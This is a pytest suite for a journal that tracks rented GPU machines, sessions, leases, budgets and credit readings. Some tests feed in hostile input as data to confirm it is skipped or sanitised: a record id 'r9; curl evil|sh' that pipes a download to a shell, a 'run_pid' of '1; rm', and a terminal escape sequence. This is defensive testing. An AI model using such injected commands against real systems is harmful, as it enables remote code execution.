import datetime as dt
import json

import pytest

from flotilla.core.storage import LocalLogStore
from flotilla.rig import journal as j

T0 = dt.datetime(2026, 10, 6, 20, 0, tzinfo=dt.timezone.utc)


class Clock:
    def __init__(self, at=T0):
        self.at = at

    def __call__(self):
        return self.at

    def forward(self, **delta):
        self.at += dt.timedelta(**delta)


def rig(tmp_path, clock=None):
    return j.Rig(LocalLogStore(tmp_path / "rig"), clock=clock or Clock())


def label_of(machine_id):
    return f"flotilla:0123456789ab:{machine_id}"


def iso(moment):
    return moment.isoformat(timespec="seconds")


def test_a_session_opens_with_its_end_and_budget(tmp_path):
    s = rig(tmp_path).open_session("max", "night frames", hours=3, budget=2.0)
    assert (s.id, s.state, s.who, s.why, s.budget) == ("s1", j.OPEN, "max", "night frames", 2.0)
    assert s.until == iso(T0 + dt.timedelta(hours=3))


def test_a_machine_is_written_with_its_label_and_lease_before_any_instance(tmp_path):
    r = rig(tmp_path)
    r.open_session("max", "x", hours=1, budget=1.0)
    m = r.add_machine("s1", "vast", label_of)
    assert (m.id, m.state, m.label, m.instance) == ("m1", j.REQUESTED, "flotilla:0123456789ab:m1", "")
    assert m.lease_until == iso(T0 + j.LEASE)


def test_a_machine_walks_its_states_and_refuses_a_jump(tmp_path):
    r = rig(tmp_path)
    r.open_session("max", "x", hours=1, budget=1.0)
    r.add_machine("s1", "vast", label_of)
    r.move("m1", j.PROVISIONING, instance="54532850", gpu="RTX A5000", hourly=0.32, created=iso(T0))
    r.move("m1", j.READY)
    r.move("m1", j.BUSY, run_pid=4242, run_mark="mark-1")
    with pytest.raises(j.RigError):
        r.move("m1", j.GONE)
    r.move("m1", j.DRAINING, reason="lease expired")
    r.move("m1", j.GONE)
    with pytest.raises(j.RigError):
        r.move("m1", j.READY)
    assert r.machines()["m1"].reason == "lease expired"


def test_a_failed_machine_with_an_instance_must_drain_before_it_is_gone(tmp_path):
    r = rig(tmp_path)
    r.open_session("max", "x", hours=1, budget=1.0)
    r.add_machine("s1", "vast", label_of)
    r.add_machine("s1", "vast", label_of)
    r.move("m1", j.FAILED, reason="no offer")
    r.move("m1", j.GONE)                              # never had an instance
    r.move("m2", j.PROVISIONING, instance="7")
    r.move("m2", j.FAILED, reason="did not boot")
    with pytest.raises(j.RigError):
        r.move("m2", j.GONE)                          # it has one: only a verified drain may end it


def test_busy_carries_its_run_and_ready_clears_it_and_starts_the_idle_clock(tmp_path):
    clock = Clock()
    r = rig(tmp_path, clock)
    r.open_session("max", "x", hours=1, budget=1.0)
    r.add_machine("s1", "vast", label_of)
    r.move("m1", j.PROVISIONING)
    r.move("m1", j.READY)
    assert r.machines()["m1"].idle_since == iso(T0)
    clock.forward(minutes=4)
    r.move("m1", j.BUSY, run_pid=4242, run_mark="mark-1")
    m = r.machines()["m1"]
    assert (m.idle_since, m.run_pid, m.run_mark) == ("", 4242, "mark-1")
    clock.forward(minutes=2)
    r.move("m1", j.READY)
    m = r.machines()["m1"]
    assert (m.idle_since, m.run_pid, m.run_mark) == (iso(T0 + dt.timedelta(minutes=6)), None, "")


def test_a_move_whose_expectation_no_longer_holds_writes_nothing(tmp_path):
    clock = Clock()
    r = rig(tmp_path, clock)
    r.open_session("max", "x", hours=1, budget=1.0)
    m = r.add_machine("s1", "vast", label_of)
    seen = m.lease_until
    clock.forward(minutes=10)
    r.renew()                                         # a run renewed after the reaper looked
    assert r.move("m1", j.DRAINING, reason="lease expired", expect={"lease_until": seen}) is None
    assert r.machines()["m1"].state == j.REQUESTED
    assert r.move("m1", j.FAILED, expect={"state": j.REQUESTED}).state == j.FAILED


def test_note_changes_fields_not_the_state(tmp_path):
    r = rig(tmp_path)
    r.open_session("max", "x", hours=1, budget=1.0)
    r.add_machine("s1", "vast", label_of)
    r.note("m1", hourly=0.41)
    m = r.machines()["m1"]
    assert (m.state, m.hourly) == (j.REQUESTED, 0.41)


def test_renewing_moves_the_lease_and_never_revives_a_draining_stuck_or_gone_machine(tmp_path):
    clock = Clock()
    r = rig(tmp_path, clock)
    r.open_session("max", "x", hours=1, budget=1.0)
    for _ in range(4):
        r.add_machine("s1", "vast", label_of)
    r.move("m2", j.DRAINING)
    r.move("m3", j.DRAINING)
    r.move("m3", j.STUCK)
    r.move("m4", j.DRAINING)
    r.move("m4", j.GONE)
    clock.forward(minutes=20)
    assert [m.id for m in r.renew()] == ["m1"]
    assert r.machines()["m1"].lease_until == iso(T0 + dt.timedelta(minutes=50))


def test_spending_counts_whole_minutes_and_the_settling_margin_once_gone(tmp_path):
    clock = Clock()
    r = rig(tmp_path, clock)
    r.open_session("max", "x", hours=3, budget=2.0)
    r.add_machine("s1", "vast", label_of)
    r.move("m1", j.PROVISIONING, instance="1", hourly=0.60, created=iso(T0))
    clock.forward(minutes=29, seconds=1)
    assert r.spent("s1") == pytest.approx(0.30)
    assert r.rate("s1") == pytest.approx(0.60)
    r.move("m1", j.DRAINING)
    r.move("m1", j.GONE)
    clock.forward(hours=2)
    assert r.spent("s1") == pytest.approx(0.60 * 32 / 60)
    assert r.rate("s1") == 0.0


def test_a_machine_never_created_costs_nothing(tmp_path):
    r = rig(tmp_path)
    r.open_session("max", "x", hours=1, budget=1.0)
    r.add_machine("s1", "vast", label_of)
    assert r.spent("s1") == 0.0 and r.rate("s1") == 0.0


def test_a_hand_written_or_hostile_line_folds_as_unknown_never_a_crash(tmp_path):
    r = rig(tmp_path)
    r.open_session("max", "x", hours=1, budget=1.0)
    path = tmp_path / "rig" / "rig.jsonl"
    with open(path, "a", encoding="utf-8") as handle:
        for event in ({"kind": "machine", "id": "m9", "state": "ready", "at": "yesterday"},
                      {"kind": "machine", "id": "m1", "state": "ready", "at": T0.isoformat(), "hourly": "lots",
                       "gpu": "A\x1b[2J5000", "attempts": -4, "run_pid": "1; rm"},
                      {"kind": "elephant", "id": "e1", "state": "x", "at": T0.isoformat()},
                      ["not", "an", "event"]):
            handle.write(json.dumps(event) + "\n")
    m1 = r.machines()["m1"]
    assert "m9" not in r.machines()
    assert m1.hourly is None and m1.attempts == 0 and m1.run_pid is None and "\x1b" not in m1.gpu
    assert set(r.sessions()) == {"s1"}


def test_ids_never_collide_with_a_hand_written_one(tmp_path):
    r = rig(tmp_path)
    r.open_session("max", "x", hours=1, budget=1.0)
    path = tmp_path / "rig" / "rig.jsonl"
    with open(path, "a", encoding="utf-8") as handle:
        handle.write(json.dumps({"kind": "machine", "id": "m7", "state": "requested", "at": T0.isoformat()}) + "\n")
    assert r.add_machine("s1", "vast", label_of).id == "m8"


def test_a_request_is_recorded_with_its_kind_and_project_and_answered_by_kind(tmp_path):
    r = rig(tmp_path)
    asked = r.ask("main session 3", "night frames", project="/work/twosuns")
    image = r.ask("main session 3", "another image", kind="image", project="/work/twosuns", image="ghcr.io/me/x:1")
    assert (asked.id, asked.kind, asked.state, asked.project) == ("r1", "machine", j.ASKED, "/work/twosuns")
    assert (image.kind, image.image) == ("image", "ghcr.io/me/x:1")
    assert [q.id for q in r.answer_requests("session s1 opened", kind="machine")] == ["r1"]
    assert r.requests()["r2"].state == j.ASKED
    assert [q.id for q in r.answer_requests("allowed", ids=["r2"])] == ["r2"]


def test_a_machine_needs_an_open_unexpired_session_inside_the_transaction(tmp_path):
    clock = Clock()
    r = rig(tmp_path, clock)
    r.open_session("max", "x", hours=1, budget=1.0)
    r.set_session("s1", j.CLOSING, reason="closed by the person")
    with pytest.raises(j.RigError, match="not open"):
        r.add_machine("s1", "vast", label_of)
    r.open_session("max", "y", hours=1, budget=1.0)
    clock.forward(minutes=61)
    with pytest.raises(j.RigError, match="ended"):
        r.add_machine("s2", "vast", label_of)


def test_the_machine_ceiling_holds_inside_the_transaction(tmp_path):
    r = rig(tmp_path)
    r.open_session("max", "x", hours=1, budget=1.0)
    r.add_machine("s1", "vast", label_of, limit=1)
    with pytest.raises(j.RigError, match="ceiling"):
        r.add_machine("s1", "vast", label_of, limit=1)
    r.move("m1", j.DRAINING)
    r.move("m1", j.GONE)
    assert r.add_machine("s1", "vast", label_of, limit=1).id == "m2"


def test_a_machine_carries_its_address_and_when_it_was_requested(tmp_path):
    r = rig(tmp_path)
    r.open_session("max", "x", hours=1, budget=1.0)
    machine = r.add_machine("s1", "vast", label_of)
    assert machine.requested == iso(T0)
    r.move("m1", j.PROVISIONING, instance="7")
    r.move("m1", j.READY, address="ssh4.vast.ai:30123")
    assert r.machines()["m1"].address == "ssh4.vast.ai:30123"


@pytest.mark.parametrize("kind, bad", [("request", "r9; curl evil|sh"), ("request", "r9\n"), ("request", "m9"),
                                       ("machine", "m1 x"), ("session", "r1")])
def test_a_record_whose_id_flotilla_never_issues_is_skipped(tmp_path, kind, bad):
    import json
    store = LocalLogStore(tmp_path / "rig")
    record = {"kind": kind, "id": bad, "state": {"request": "asked", "machine": "ready", "session": "open"}[kind],
              "at": "2026-10-07T20:00:00+00:00"}
    (tmp_path / "rig").mkdir(exist_ok=True)
    with open(tmp_path / "rig" / "rig.jsonl", "a", encoding="utf-8") as out:
        out.write(json.dumps(record) + "\n")
    rig = j.Rig(store)
    assert not rig.requests() and not rig.machines() and not rig.sessions()


def test_the_first_credit_reading_is_the_sessions_open_and_later_ones_only_now(tmp_path):
    clock = Clock()
    r = rig(tmp_path, clock)
    r.open_session("max", "night frames", hours=3, budget=2.0)
    r.note_credit("s1", 41.2)
    clock.forward(minutes=5)
    s = r.note_credit("s1", 40.05)
    assert (s.credit_open, s.credit_now, s.credited, s.state) == (41.2, 40.05, iso(clock.at), j.OPEN)


@pytest.mark.parametrize("bad", [float("nan"), float("inf"), 1e7, "41", True])
def test_a_credit_that_is_no_amount_is_not_kept(tmp_path, bad):
    r = rig(tmp_path)
    r.open_session("max", "x", hours=1, budget=1.0)
    s = r.note_credit("s1", bad)
    assert s.credit_open is None and s.credit_now is None


def test_a_credit_may_be_below_zero(tmp_path):
    r = rig(tmp_path)
    r.open_session("max", "x", hours=1, budget=1.0)
    assert r.note_credit("s1", -1.5).credit_now == -1.5


def test_a_closed_sessions_credit_is_not_noted(tmp_path):
    r = rig(tmp_path)
    r.open_session("max", "x", hours=1, budget=1.0)
    r.set_session("s1", j.CLOSING)
    r.set_session("s1", j.CLOSED)
    assert r.note_credit("s1", 41.2) is None and r.sessions()["s1"].credit_now is None


def test_a_credit_too_large_for_a_float_is_dropped_not_a_crash_of_the_fold(tmp_path):
    """A journal line any process may write: an integer past a float's range must not stop the reaper (security
    review of 0.13.0)."""
    r = rig(tmp_path)
    r.open_session("max", "x", hours=1, budget=1.0)
    r.note_credit("s1", 10 ** 400)
    assert r.sessions()["s1"].credit_now is None


def test_a_closing_sessions_credit_keeps_it_closing(tmp_path):
    r = rig(tmp_path)
    r.open_session("max", "x", hours=1, budget=1.0)
    r.set_session("s1", j.CLOSING, "closed by max")
    s = r.note_credit("s1", 41.2)
    assert (s.state, s.reason, s.credit_now) == (j.CLOSING, "closed by max", 41.2)


def test_a_reading_the_journal_would_drop_never_erases_a_good_one(tmp_path):
    r = rig(tmp_path)
    r.open_session("max", "x", hours=1, budget=1.0)
    r.note_credit("s1", 41.2)
    r.note_credit("s1", 5e6)
    assert r.sessions()["s1"].credit_now == 41.2
